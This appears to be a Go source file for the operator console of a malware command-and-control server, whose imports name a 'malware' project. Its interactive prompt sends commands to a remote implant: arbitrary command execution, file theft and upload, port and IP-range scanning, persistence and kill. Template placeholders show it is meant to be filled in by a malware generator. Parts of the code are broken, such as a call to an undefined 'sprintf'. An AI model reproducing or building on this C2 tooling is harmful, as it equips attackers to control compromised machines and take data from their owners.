package main

import (
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"malware/common/messages"
	"malware/common/types"
	"os"
	"strconv"
	"strings"

	network "malware/c2/_NETWORK_TYPE_"

	"github.com/chzyer/readline"
)

type c2 struct {
	queue chan *messages.CheckCmdReply // Queue of commands to send to implant
	term  *readline.Instance           // Terminal
}

// Colour constants
const (
	RESET = "\033[0m"
	RED   = "\033[31m"
)

func help() {
	log.Println("Commands: (If module is enabled)")
	log.Println("\tlist                      -> List enabled modules")
	log.Println("\tportscan <ip> <from> <to> -> Scan ports")
	log.Println("\tportscan cancel           -> Cancel portscan")
	log.Println("\tipscan <iprange>          -> Scan iprange ie: 10.0.0.1/24")
	log.Println("\tipscan cancel             -> Cancel ipscan")
	log.Println("\texec <cmd>                -> Exec command")
	log.Println("\tgetfile <filename>        -> Get file from server")
	log.Println("\tputfile <local> <remote>  -> Put file from server")
	log.Println("\tkill                      -> Kill the implant")
	log.Println("\tsleep <seconds>           -> Sleep the implant")
}

func incorrect_usage() {
	fmt.Println("Incorrect usage")
	help()
}

// Handle user input
func (c2 *c2) handle_user_input(text string) {
	parts := strings.Split(strings.TrimSpace(text), " ")

	switch parts[0] {
	case "ipscan":
		if len(parts) != 2 {
			incorrect_usage()
			return
		}
		if strings.Compare("cancel", parts[1]) == 0 {
			c2.queue <- messages.C2_ipscan_cancel()
		} else {
			c2.queue <- messages.C2_ipscan_range(parts[1])
		}
	case "portscan":
		if len(parts) == 2 && strings.Compare("cancel", parts[1]) == 0 {
			// Cancel the scan
			c2.queue <- messages.C2_portscan_cancel()
			return
		}

		if len(parts) != 4 {
			incorrect_usage()
			return
		}
		start, err := strconv.Atoi(parts[2])
		if err != nil {
			incorrect_usage()
			return
		}
		end, err := strconv.Atoi(parts[3])
		if err != nil {
			incorrect_usage()
			return
		}

		c2.queue <- messages.C2_portscan_range(parts[1], uint32(start), uint32(end))
	case "exec":
		if len(parts) < 2 {
			incorrect_usage()
			return
		}

		c2.queue <- messages.C2_exec(parts[1], parts[2:])
	case "getfile":
		if len(parts) != 2 {
			incorrect_usage()
			return
		}

		c2.queue <- messages.C2_getfile(parts[1])
	case "putfile":
		if len(parts) != 3 {
			incorrect_usage()
			return
		}
		out, err := ioutil.ReadFile(parts[1])
		if err != nil {
			fmt.Println("Can't find file: ", parts[1])
			return
		}

		c2.queue <- messages.C2_uploadfile(parts[2], out)
	case "list":
		c2.queue <- messages.C2_listmodules()
	case "kill":
		c2.queue <- messages.C2_kill()
		log.Println("Killed implant")
	case "sleep":
		if len(parts) != 2 {
			incorrect_usage()
			return
		}
		seconds, err := strconv.Atoi(parts[1])
		if err != nil {
			fmt.Println("Not a valid int: " + parts[1])
			return
		}

		log.Println("Implant sleeping...")
		c2.queue <- messages.C2_sleep(int64(seconds))
	case "persistence":
		if len(parts) != 2 {
			incorrect_usage()
			return
		}

		b, err := strconv.ParseBool(parts[1])
		if err != nil {
			fmt.Println("Not a valid bool: " + parts[1])
		}

		log.Println(sprintf("Setting persistence to %t", b))
		c2.queue <- messages.C2_persistence(b)
	case "help":
		help()
	default:
		log.Println("Cmd not found: ", parts[0])
	}
}

// Read user input until a ctrl+d
func (c2 *c2) ReadUserInput() {
	for {
		line, err := c2.term.Readline()
		if err == readline.ErrInterrupt {
			continue
		} else if err == io.EOF {
			os.Exit(0)
		}

		c2.handle_user_input(line)

	}
}

// Function constructor - constructs new function for listing given directory
// Used for putfile auto tabcomplete
func listfiles(line string) []string {
	names := make([]string, 0)

	filename := strings.TrimSpace(line)
	parts := strings.Split(filename, " ")
	var dir string
	if len(parts) == 1 {
		dir = "./"
	} else {
		filename = parts[1]
		last_index := strings.LastIndex(filename, "/")

		if last_index == -1 {
			last_index = len(filename) - 1
		}

		dir = filename[:last_index+1]
		filename = filename[last_index+1:]
	}

	files, _ := ioutil.ReadDir(dir)
	for _, f := range files {
		if (dir == "./" || strings.HasPrefix(f.Name(), filename)) && !strings.HasPrefix(f.Name(), ".") {
			names = append(names, dir+f.Name())
		}
	}
	return names
}

var completer = readline.NewPrefixCompleter( // Tab completer
	readline.PcItem("exec"),
	readline.PcItem("getfile"),
	readline.PcItem("putfile", readline.PcItemDynamic(listfiles)),
	readline.PcItem("portscan", readline.PcItem("cancel")),
	readline.PcItem("ipscan", readline.PcItem("cancel")),
	readline.PcItem("kill"),
	readline.PcItem("list"),
	readline.PcItem("sleep"),
	readline.PcItem("help"),
)

func main() {
	if len(os.Args) != 3 {
		panic("Require Cert and Key as argument")
	}

	log.SetFlags(log.Ltime)

	reader, err := readline.NewEx(&readline.Config{
		Prompt:          RED + "c2%" + RESET + " ",
		HistoryFile:     "/tmp/c2_history.tmp",
		AutoComplete:    completer,
		InterruptPrompt: "^C",
		EOFPrompt:       "exit",

		HistorySearchFold: true,
	})

	if err != nil {
		panic(err)
	}
	defer reader.Close()
	log.SetOutput(reader.Stderr())

	// Will be replaced on creation from malware generation
	c2 := &c2{queue: make(chan *messages.CheckCmdReply, 100), term: reader}

	go func() {
		c2.ReadUserInput() // Read user input async
		network.KillNetwork()

	}()

	network.InitNetwork(_C2_PORT_, handleReply, c2.queue)

	fmt.Println("Exiting due to listener shutting down")
}

func handleReply(reply *messages.CheckCmdRequest) {
	reply.RandomPadding = []byte{}

	if err := reply.GetError(); err != 0 {
		log.Println(RED + "Error: " + types.ErrorToString[err] + RESET)
	} else {
		log.Println(strings.Replace(reply.String(), "\\n", "\n", -1) + "")
	}
}
